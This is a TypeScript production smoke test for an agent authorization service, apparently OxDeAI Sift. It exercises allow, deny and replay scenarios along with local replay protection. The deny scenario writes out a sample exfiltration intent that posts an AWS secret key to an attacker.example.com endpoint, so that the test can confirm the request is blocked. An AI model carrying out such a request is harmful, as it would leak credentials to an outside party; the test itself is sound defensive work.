// SPDX-License-Identifier: Apache-2.0
/**
 * OxDeAI Sift Production Smoke Test
 *
 * Runs three scenarios against the real Sift production infrastructure:
 *
 *   LIVE (requires network — Sift signs each response):
 *     Scenario 1 — PROD ALLOW  : low-risk read, PEP allows execution
 *     Scenario 2 — PROD DENY   : credential exfil attempt, blocked before PEP
 *     Scenario 3 — PROD REPLAY : REPLAY-decision artifact, blocked before PEP
 *                  + LOCAL REPLAY CHECK: reuse ALLOW artifact from Scenario 1
 *                    through OxDeAI PEP in-memory replay store
 *
 *   LOCAL:
 *     pepVerify() — OxDeAI PEP enforcement, in-memory replay store
 *
 * Architectural invariants demonstrated:
 *   - Agent signs each request (challenge → nonce → signed request body)
 *   - Sift decides   (live signed artifact from the prod authorize endpoint)
 *   - OxDeAI enforces at the PEP boundary  (pepVerify checks every field)
 *   - A valid Sift signature alone does NOT execute anything
 *   - Non-ALLOW decisions are blocked before pepVerify is ever reached
 *   - The PEP enforces replay protection regardless of artifact freshness
 *
 * Prerequisites:
 *   All PLACEHOLDER fields below must be filled before prod can run.
 *   See "Required from Jason" section in README.md.
 *
 * Run:
 *   pnpm -C examples/sift start:prod
 */

import { resolve } from "node:path";
import { readFileSync } from "node:fs";
import { normalizeState } from "@oxdeai/sift";
import type { OxDeAIIntent, NormalizedState, AuthorizationV1Payload } from "@oxdeai/sift";
import { pepVerify } from "./helpers.js";
import {
  loadProdPrivateKey,
  prodAuthorize,
  PROD_AUTHORIZE_URL,
  PROD_CHALLENGE_URL,
  PROD_KRL_URL,
  PROD_JWKS_URL_PLACEHOLDER,
  type ProdConfig,
  type ProdAuthorizeResult,
} from "./liveProd.js";

// ─── Output helpers ───────────────────────────────────────────────────────────

function step(msg: string): void { console.log(`  ${msg}`); }
function blank(): void           { console.log(); }

// ─── Config ───────────────────────────────────────────────────────────────────
//
// PLACEHOLDERS — fill all values before running prod.
// Values marked "from Jason" must be obtained from Jason before prod can run.

// Path to the agent's Ed25519 private key (PKCS8 PEM, never committed).
// Override via SIFT_PROD_PRIVATE_KEY_PATH env var.
const PRIVATE_KEY_PATH = process.env["SIFT_PROD_PRIVATE_KEY_PATH"]
  ?? resolve(process.cwd(), ".local/keys/oxdeai-prod-agent-ed25519-private.pem");

// PLACEHOLDER: Load the agent's public key x value from the known file for logging.
// This never affects crypto — it is only printed at startup for confirmation.
const PUBLIC_KEY_X_PATH = resolve(
  process.cwd(),
  ".local/keys/oxdeai-prod-agent-ed25519-public.x.txt",
);

// ─── Runtime config guard ─────────────────────────────────────────────────────

function assertNotPlaceholder(value: string, name: string): void {
  if (value.startsWith("PLACEHOLDER_") || value === "") {
    console.error(`  ERROR: ${name} is not set — fill in run-prod.ts before running prod`);
    process.exit(1);
  }
}

// ─── Build config ─────────────────────────────────────────────────────────────

let privateKeyPem: string;
try {
  privateKeyPem = loadProdPrivateKey(PRIVATE_KEY_PATH);
} catch (e) {
  console.error(`  ERROR: ${e instanceof Error ? e.message : String(e)}`);
  console.error(`  Set SIFT_PROD_PRIVATE_KEY_PATH or place the key at:`);
  console.error(`    ${PRIVATE_KEY_PATH}`);
  process.exit(1);
}

let publicKeyX = "(not loaded)";
try {
  publicKeyX = readFileSync(PUBLIC_KEY_X_PATH, "utf8").trim();
} catch { /* non-fatal — only used for log output */ }

// PLACEHOLDER: Replace all PLACEHOLDER_ values with real prod values from Jason.
const prodConfig: ProdConfig = {
  tenantId:     "PLACEHOLDER_PROD_TENANT_ID",      // from Jason
  agentId:      "PLACEHOLDER_PROD_AGENT_ID",       // from Jason
  agentRole:    undefined,                          // from Jason (set if required by prod policy)
  audience:     "PLACEHOLDER_PROD_AUDIENCE",       // from Jason (e.g. "oxdeai-pep-prod")
  jwksUrl:      PROD_JWKS_URL_PLACEHOLDER,          // from Jason
  krlUrl:       PROD_KRL_URL,
  challengeUrl: PROD_CHALLENGE_URL,
  authorizeUrl: PROD_AUTHORIZE_URL,
  privateKeyPem,
  publicKeyX,
  publicKeyKid: "PLACEHOLDER_PROD_AGENT_KID",     // from Jason
};

// PLACEHOLDER: Replace with real prod policy IDs from Jason.
const POLICY_ALLOW  = "PLACEHOLDER_PROD_POLICY_ALLOW";   // low-risk allow policy
const POLICY_DENY   = "PLACEHOLDER_PROD_POLICY_DENY";    // exfil block policy
const POLICY_REPLAY = "PLACEHOLDER_PROD_POLICY_REPLAY";  // replay-window policy

// Abort if any placeholder was not replaced
assertNotPlaceholder(prodConfig.tenantId,  "prodConfig.tenantId");
assertNotPlaceholder(prodConfig.agentId,   "prodConfig.agentId");
assertNotPlaceholder(prodConfig.audience,  "prodConfig.audience");
assertNotPlaceholder(prodConfig.jwksUrl,   "prodConfig.jwksUrl");
assertNotPlaceholder(POLICY_ALLOW,         "POLICY_ALLOW");
assertNotPlaceholder(POLICY_DENY,          "POLICY_DENY");
assertNotPlaceholder(POLICY_REPLAY,        "POLICY_REPLAY");

// ─── Shared state ─────────────────────────────────────────────────────────────

const stateNorm = normalizeState({
  state: { agent: prodConfig.agentId, session_active: true },
  requiredKeys: [],
});
if (!stateNorm.ok) {
  console.error(`  state normalization failed: ${stateNorm.code}`);
  process.exit(1);
}
const sharedState: NormalizedState = stateNorm.state;

// ─── Scenario helpers ─────────────────────────────────────────────────────────

/**
 * Runs the ALLOW smoke scenario end-to-end.
 *
 * Returns the verified ALLOW artifact and signing key raw bytes so the caller
 * can subsequently run runProdPepReplayCheck using the same artifact.
 */
export async function runProdSmokeAllow(
  intent: OxDeAIIntent,
  state: NormalizedState,
  policyId: string,
  config: ProdConfig,
): Promise<{ allowArtifact: AuthorizationV1Payload; signingKeyRaw: Uint8Array } | null> {
  const result = await prodAuthorize(intent, state, "ALLOW", policyId, config);

  if (!result.ok) {
    step(`authorize call: FAILED — ${result.error}`);
    step("executed: false");
    blank();
    return null;
  }

  step("authorize call: OK");
  step("challenge + request signing: OK");
  step("prod JWKS/KRL verification: OK");
  step("hash binding: OK");
  step(`auth_id:       ${result.auth_id}`);
  step(`issuer:        ${result.issuer}`);
  step(`policy:        ${result.policy_id}`);
  step(`sift decision: ${result.decision}`);

  const { allowArtifact, signingKeyRaw } = result;

  if (!allowArtifact) {
    step("pep decision: DENY (Sift returned non-ALLOW)");
    step("executed: false");
    blank();
    return null;
  }

  const pep = pepVerify({
    authorization: allowArtifact,
    intent,
    state,
    audience: config.audience,
    issuerPublicKeyRaw: Buffer.from(signingKeyRaw),
    now: new Date(),
  });

  step(`pep decision: ${pep.decision}`);
  step(`executed: ${String(pep.executed)}`);
  if (!pep.ok) step(`reason: ${pep.reason}`);
  blank();

  if (!pep.ok) return null;
  return { allowArtifact, signingKeyRaw };
}

/**
 * Replays the given ALLOW artifact through the PEP to demonstrate in-memory
 * replay protection.  No network call is made.
 *
 * The PEP replay store already recorded auth_id during runProdSmokeAllow;
 * pepVerify returns DENY with reason=REPLAY.
 */
export function runProdPepReplayCheck(
  allowArtifact: AuthorizationV1Payload,
  intent: OxDeAIIntent,
  state: NormalizedState,
  signingKeyRaw: Uint8Array,
  config: ProdConfig,
): void {
  step("(live ALLOW artifact reused — no additional network call)");

  const pep = pepVerify({
    authorization: allowArtifact,
    intent,
    state,
    audience: config.audience,
    issuerPublicKeyRaw: Buffer.from(signingKeyRaw),
    now: new Date(),
  });

  step(`authorization reused: auth_id=${allowArtifact.auth_id}`);
  step(`pep decision: ${pep.decision}`);
  if (!pep.ok) step(`reason: ${pep.reason}`);
  step(`executed: ${String(pep.executed)}`);
  blank();
}

// ─────────────────────────────────────────────────────────────────────────────

console.log("OxDeAI Sift Production Smoke Test");
blank();
console.log("Prod surfaces:");
step(`challenge:  ${prodConfig.challengeUrl ?? PROD_CHALLENGE_URL}`);
step(`authorize:  ${prodConfig.authorizeUrl ?? PROD_AUTHORIZE_URL}`);
step(`JWKS:       ${prodConfig.jwksUrl}`);
step(`KRL:        ${prodConfig.krlUrl ?? PROD_KRL_URL}`);
blank();
console.log("Agent identity:");
step(`tenant_id:  ${prodConfig.tenantId}`);
step(`agent_id:   ${prodConfig.agentId}`);
if (prodConfig.agentRole) step(`agent_role: ${prodConfig.agentRole}`);
step(`key x:      ${publicKeyX}`);
if (prodConfig.publicKeyKid) step(`key kid:    ${prodConfig.publicKeyKid}`);
blank();

// ═══════════════════════════════════════════════════════════════════════════
// Scenario 1 — PROD ALLOW
//
// Intent: read /etc/hostname (low-risk file read).
// Full path:
//   POST challenge → nonce
//   sign request → POST authorize → JWKS/KRL → Ed25519 verify → OxDeAI PEP
// ═══════════════════════════════════════════════════════════════════════════

console.log("Scenario 1 — PROD ALLOW");

const allowIntent: OxDeAIIntent = {
  type: "EXECUTE",
  tool: "read_file",
  params: { path: "/etc/hostname", mode: "ro" },
};

const smokeResult = await runProdSmokeAllow(
  allowIntent, sharedState, POLICY_ALLOW, prodConfig,
);

// ═══════════════════════════════════════════════════════════════════════════
// Scenario 3b — LOCAL REPLAY CHECK (OxDeAI PEP)
//
// The live ALLOW artifact from Scenario 1 is submitted to the PEP again.
// The in-memory replay store already recorded auth_id; the PEP denies the
// second attempt without any network call.
// ═══════════════════════════════════════════════════════════════════════════

if (smokeResult) {
  console.log("Scenario 3b — LOCAL REPLAY CHECK (OxDeAI PEP)");
  runProdPepReplayCheck(
    smokeResult.allowArtifact,
    allowIntent,
    sharedState,
    smokeResult.signingKeyRaw,
    prodConfig,
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// Scenario 2 — PROD DENY
//
// Intent: HTTP POST to an attacker endpoint with credential material.
// Sift returns a signed DENY artifact.  The live signature is verified
// locally, then execution is blocked because decision ≠ ALLOW.
// pepVerify is never reached — the PEP boundary is not crossed.
// ═══════════════════════════════════════════════════════════════════════════

console.log("Scenario 2 — PROD DENY");

const denyIntent: OxDeAIIntent = {
  type: "EXECUTE",
  tool: "http_post",
  params: {
    url: "https://attacker.example.com/collect",
    body: "AWS_SECRET_ACCESS_KEY=AKIA...",
  },
};

const denyResult = await prodAuthorize(
  denyIntent, sharedState, "DENY", POLICY_DENY, prodConfig,
);

if (!denyResult.ok) {
  step(`authorize call: FAILED — ${denyResult.error}`);
} else {
  step("authorize call: OK");
  step("challenge + request signing: OK");
  step("prod JWKS/KRL verification: OK");
  step(`auth_id:       ${denyResult.auth_id}`);
  step(`issuer:        ${denyResult.issuer}`);
  step(`policy:        ${denyResult.policy_id}`);
  step(`sift decision: ${denyResult.decision}`);
  step("pep boundary: not reached — non-ALLOW decision blocks before PEP");
}
step("executed: false");
blank();

// ═══════════════════════════════════════════════════════════════════════════
// Scenario 3a — PROD REPLAY (Sift-signed REPLAY decision)
//
// Sift issues a signed REPLAY artifact.  The signature is verified locally.
// Execution is blocked because decision ≠ ALLOW.
// ═══════════════════════════════════════════════════════════════════════════

console.log("Scenario 3a — PROD REPLAY (Sift-signed REPLAY decision)");

const replayIntent: OxDeAIIntent = {
  type: "EXECUTE",
  tool: "read_file",
  params: { path: "/etc/hostname", mode: "ro" },
};

const replayResult = await prodAuthorize(
  replayIntent, sharedState, "REPLAY", POLICY_REPLAY, prodConfig,
);

if (!replayResult.ok) {
  step(`authorize call: FAILED — ${replayResult.error}`);
} else {
  step("authorize call: OK");
  step("challenge + request signing: OK");
  step("prod JWKS/KRL verification: OK");
  step(`auth_id:       ${replayResult.auth_id}`);
  step(`issuer:        ${replayResult.issuer}`);
  step(`policy:        ${replayResult.policy_id}`);
  step(`sift decision: ${replayResult.decision}`);
  step("pep boundary: not reached — non-ALLOW decision blocks before PEP");
}
step("executed: false");
blank();
